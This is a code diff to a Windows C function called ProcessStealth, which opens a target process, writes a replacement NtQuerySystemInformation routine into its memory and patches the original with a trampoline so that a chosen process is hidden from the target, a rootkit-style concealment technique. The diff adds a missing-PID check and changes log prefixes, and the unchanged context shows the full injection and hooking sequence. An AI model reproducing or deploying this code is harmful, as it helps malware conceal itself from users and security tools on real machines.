@@ -61,21 +61,29 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
 
     BYTE TrampolineCode[12] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 };
 
+    printf("[*] Search %S PID\n", TargetProcessName);
+
     DWORD TargetPID = GetProcessIdByImageName(TargetProcessName);
+
+    if (TargetPID == NULL)
+    {
+        printf("[-] %S Not found!\n", TargetProcessName);
+        return FALSE;
+    }
+
+    PVOID NtQuerySystemInformation = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
+
+    printf("[*] NtQuerySystemInformation : 0x%p\n", NtQuerySystemInformation);
 
     printf("[*] Target Process Name : %S\n", TargetProcessName);
     printf("[*]  Hide Process Name  : %S\n", HideProcessName);
 
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);
 
-    PVOID NtQuerySystemInformation = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
-
-    printf("[*] NtQuerySystemInformation : 0x%p\n", NtQuerySystemInformation);
-
     if (hProcess == NULL)
     {
         printf("[-] OpenProcess Failed!\n");
-        printf("[*] GetLastError : %d\n", GetLastError());
+        printf("[+] GetLastError : %d\n", GetLastError());
         return FALSE;
     }
 
@@ -84,7 +92,7 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
     if (NewFunction == NULL)
     {
         printf("[-] VirtualAllocEx Failed!\n");
-        printf("[*] GetLastError : %d\n", GetLastError());
+        printf("[+] GetLastError : %d\n", GetLastError());
         return FALSE;
     }
 
@@ -97,7 +105,7 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
     if (WriteProcessMemory(hProcess, NewFunction, NewNtQuerySystemInformation, NewNtQuerySystemInformation_Size, &NumberOfBytesWritten) == FALSE)
     {
         printf("[-] WriteProcessMemory Failed!\n");
-        printf("[*] GetLastError : %d\n", GetLastError());
+        printf("[+] GetLastError : %d\n", GetLastError());
         return FALSE;
     }
 
@@ -115,7 +123,7 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
     if (WriteProcessMemory(hProcess, SyscallClone, Syscall, 16, &NumberOfBytesWritten) == FALSE)
     {
         printf("[-] WriteProcessMemory Failed!\n");
-        printf("[*] GetLastError : %d\n", GetLastError());
+        printf("[+] GetLastError : %d\n", GetLastError());
         return FALSE;
     }
 
@@ -126,7 +134,7 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
     if (WriteProcessMemory(hProcess, ProcessName, HideProcessName, wcslen(HideProcessName) * 2, &NumberOfBytesWritten) == FALSE)
     {
         printf("[-] WriteProcessMemory Failed!\n");
-        printf("[*] GetLastError : %d\n", GetLastError());
+        printf("[+] GetLastError : %d\n", GetLastError());
         return FALSE;
     }
 
@@ -136,7 +144,7 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
     if (WriteProcessMemory(hProcess, (ULONGLONG)NewFunction + SearchOverwriteOffset(NewNtQuerySystemInformation), &SyscallClone, 8, &NumberOfBytesWritten) == FALSE)
     {
         printf("[-] WriteProcessMemory Failed!\n");
-        printf("[*] GetLastError : %d\n", GetLastError());
+        printf("[+] GetLastError : %d\n", GetLastError());
         return FALSE;
     }
 
@@ -145,7 +153,7 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
     /*if (WriteProcessMemory(hProcess, (ULONGLONG)NewFunction + SearchOverwriteOffset(NewNtQuerySystemInformation), &ProcessName, 8, &NumberOfBytesWritten) == FALSE)
     {
         printf("[-] WriteProcessMemory Failed!\n");
-        printf("[*] GetLastError : %d\n", GetLastError());
+        printf("[+] GetLastError : %d\n", GetLastError());
         return FALSE;
     }*/
 
@@ -154,7 +162,7 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
     if (VirtualProtectEx(hProcess, NtQuerySystemInformation, 12, PAGE_EXECUTE_READWRITE, &OldProtect) == FALSE)
     {
         printf("[-] VirtualProtectEx Failed!\n");
-        printf("[*] GetLastError : %d\n", GetLastError());
+        printf("[+] GetLastError : %d\n", GetLastError());
         return FALSE;
     }
 
@@ -163,7 +171,7 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
     if (WriteProcessMemory(hProcess, NtQuerySystemInformation, TrampolineCode, 12, &NumberOfBytesWritten) == FALSE)
     {
         printf("[-] WriteProcessMemory Failed!\n");
-        printf("[*] GetLastError : %d\n", GetLastError());
+        printf("[+] GetLastError : %d\n", GetLastError());
         return FALSE;
     }
 
